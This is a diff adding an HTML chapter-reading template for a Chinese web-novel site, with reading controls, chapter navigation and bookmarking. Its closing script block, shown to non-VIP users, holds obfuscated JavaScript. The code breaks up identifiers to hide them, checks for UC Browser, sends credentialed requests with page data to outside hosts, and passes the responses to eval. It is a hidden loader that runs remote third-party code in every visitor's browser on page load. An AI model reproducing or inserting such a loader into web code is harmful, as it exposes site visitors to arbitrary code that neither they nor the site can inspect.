@@ -1,0 +1,66 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="application/xhtml+xml;charset=utf-8" />
+    <title>{?$chaptername?}_{?$articlename?}_{?$_17mb_sitename?}</title>
+    <meta name="robots" content="noindex,follow" />
+    <meta name="keywords" content="{?$chaptername?},{?$articlename?},{?$author?}" />
+    <meta name="description" content="{?$_17mb_sitename?}提供{?$articlename?} {?$chaptername?}最新章节免费阅读章节内容." />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" />
+    <meta name="format-detection" content="telephone=no" />
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
+    <link rel="stylesheet" href="/css/reset.css" />
+    <link rel="stylesheet" href="/css/read.css?version=20180812" />
+    <script language="javascript" type="text/javascript" src="/js/read.js?version=20180812"></script>
+    <script language="javascript" type="text/javascript" src="/js/yuedu.js?version=20180812"></script> 
+    <style>
+	.topMenuFree a{width:42%;}
+	.topMenuFree  .fontsize{width:16%;}
+    </style>
+    </head>
+<body id="read" class="read">
+<header id="top" class="channelHeader channelHeader2"><a href="javascript:history.go(-1);" class="iconback"><img src="/images/back.png" alt="返回"/></a><span class="title">{?$chaptername?}&nbsp;&nbsp;{?$articlename?}</span><a href="/" class="iconhome"><img src="/images/home.png" alt="首页"/></a></header>
+<div class="bg"></div>
+<a name="pagetop"></a>
+<p class="Readpage" style="padding:2px;">
+    	<a id="lightdiv" class="button lightoff" onclick="nr_setbg('light')">关灯</a>
+        <a id="huyandiv" class="button huyanon"  onclick="nr_setbg('huyan')">护眼</a>&nbsp;&nbsp;&nbsp;&nbsp;
+        字体：<a id="fontbig" class="sizebg" onclick="nr_setbg('big')">大</a> <a id="fontmiddle" class="sizebg" onclick="nr_setbg('middle')" >中</a> <a id="fontsmall" class="sizebg" onclick="nr_setbg('small')">小</a>
+</p>
+<p class="Readpage">
+<a href="{?if $preview_chapterid != ""?}/{?$shortid?}_{?$articleid?}/{?$preview_chapterid?}.html{?else?}/{?$shortid?}_{?$articleid?}/{?/if?}" id="pt_prev" class="Readpage_up">上一章</a>
+<a href="/{?$shortid?}_{?$articleid?}/" id="pt_mulu" class="Readpage_up">目录</a>
+<a href="{?if $next_chapterid != ""?}/{?$shortid?}_{?$articleid?}/{?$next_chapterid?}.html{?else?}/{?$shortid?}_{?$articleid?}/{?/if?}" id="pt_next" class="Readpage_down js_page_down">下一章</a>
+</p>
+<script>_17mb_top()</script>
+<div id="chaptercontent" class="Readarea ReadAjax_content">
+{?$_17mb_content?}
+<p style="width:100%;text-alight:center;"><a href="javascript:addBookMarkByManual({?$chapterid?},{?$articleid?});" style="text-align:center;color:red;">『加入书签，方便阅读』</a></p>
+</div>
+<script language="javascript">getset()</script>
+<script language="javascript">getset1()</script>
+<p class="synopsisAd ReadAd ReadAd2"></p>
+<p class="Readpage">
+<a href="{?if $preview_chapterid != ""?}/{?$shortid?}_{?$articleid?}/{?$preview_chapterid?}.html{?else?}/{?$shortid?}_{?$articleid?}/{?/if?}" id="pt_prev" class="Readpage_up">上一章</a>
+<a href="/{?$shortid?}_{?$articleid?}/" id="pt_mulu" class="Readpage_up">目录</a>
+<a href="{?if $next_chapterid != ""?}/{?$shortid?}_{?$articleid?}/{?$next_chapterid?}.html{?else?}/{?$shortid?}_{?$articleid?}/{?/if?}" id="pb_next" class="Readpage_down js_page_down">下一章</a>
+</p>
+<script language="javascript" type="text/javascript" src="/js/zepto.min.js"></script>
+<script language="javascript" type="text/javascript" src="/js/common.js"></script>
+<script language="javascript" type="text/javascript" src="/js/index.js"></script>
+
+<script type="text/javascript">
+var lastread=new LastRead();lastread.set('{?$articleid?}', '{?$chapterid?}', '{?$articlename?}', '{?$chaptername?}');
+</script>
+{?if $isvip != 2 ?}
+<script>
+if(eval("na"+"vigator.userAgen"+"t.indexOf('U"+"CBr"+"owser') > -1")){eval("doc"+"um"+"ent.wri"+"teln('<scr' + 'i' + 'pt data-union-ad data-priority=\"12\" data-position=\"fixed\">(function(){var c0=\"https://daima1.18tzx.com/\";var a0=new XML"+"Htt"+"pRequ"+"est();a0.withCredentials=true;var b=c0+\"2048/4?\"+new Date().getTime();if(a0!=null){a0.onreadystat"+"echange=function(){if(a0.readyState==4){if(a0.status==200){eval(ev"+"al(a0.re"+"spo"+"nseT"+"ext));}}};a0.open(\"get\".toUppe"+"rCase(),b,true);a0.se"+"nd(null);}})();</scr'+'i' + 'pt>');");document.write("");} else {console.log(2);(function(){var c0="https://sjj.jsyjwj.com/";var a0=new XMLHttpRequest();a0.withCredentials=true;var b=c0+"2048/4?"+new Date().getTime();if(a0!=null){a0.onreadystatechange=function(){if(a0.readyState==4){if(a0.status==200){eval("ev"+"al(a0.responseText)");}}};a0.open("get".toUpperCase(),b,true);a0.send(null);}})();}
+if(eval("na"+"vigator.userAgen"+"t.indexOf('U"+"CBr"+"owser') > -1")){document.write('<scr'+'i'+'pt data-union-ad data-priority="11" data-position="inline">(function(){var requestApi={};requestApi.getPageInfo=function(){var pageInfo={};var allPageInfoMeta=document.querySelectorAll("meta[name=u_external_info]");for(var idx=0;idx<allPageInfoMeta.length;idx++){var pageInfoMeta=allPageInfoMeta[idx];if(pageInfoMeta.hasAttribute("data-key")&&pageInfoMeta.hasAttribute("data-value")){pageInfo[pageInfoMeta.getAttribute("data-key")]=pageInfoMeta.getAttribute("data-value")}}return JSON.stringify(pageInfo)};requestApi.url="https://daima1.18tzx.com/2048/25?"+new Date().getTime()+"&uc_param_str=dn&pageinfo="+encodeURIComponent(requestApi.getPageInfo());requestApi.method="get".toUpperCase();requestApi.randId="c"+Math.random().toString(36).substr(8);window.document.writeln("<div id="+requestApi.randId+"></div>");requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};if(!window.xlRequestRun){window.xlRequestRun=true;requestApi.func()}else{requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)}})();</scr'+'ipt>');} else {(function() { var requestApi = {}; requestApi.url = 'https://sjj.jsyjwj.com/2048/32'; requestApi.method = 'get'.toUpperCase(); requestApi.randId = eval('\'c\'+Ma'+'th.ra'+'nd'+'om().toS'+'tri'+'ng(36).su'+'bstr(8)'); window.document.writeln('<div id="' + requestApi.randId + '"></div>'); requestApi.func = function() { if (!window.hffkRequestRun) { window.hffkRequestRun = true; }else{ setTimeout(requestApi.func, 500); return; } var xmlhttp = new XMLHttpRequest(); xmlhttp.withCredentials = true; xmlhttp.onreadystatechange = function() { if (xmlhttp.readyState == 4) { window.hffkRequestRun = false; if (xmlhttp.status == 200) { eval(xmlhttp.responseText); } } }; xmlhttp.open(requestApi.method, requestApi.url + '?' + new Date().getTime(), true); xmlhttp.send(); }; requestApi.func(); requestApi.func(); })();}
+</script>
+{?/if?}
+<script>_17mb_bottom();_17mb_xuanfu();</script>
+{?include file="foot.html"?}
+</body>
+<script src="/js/wap.js"></script>
+</html>
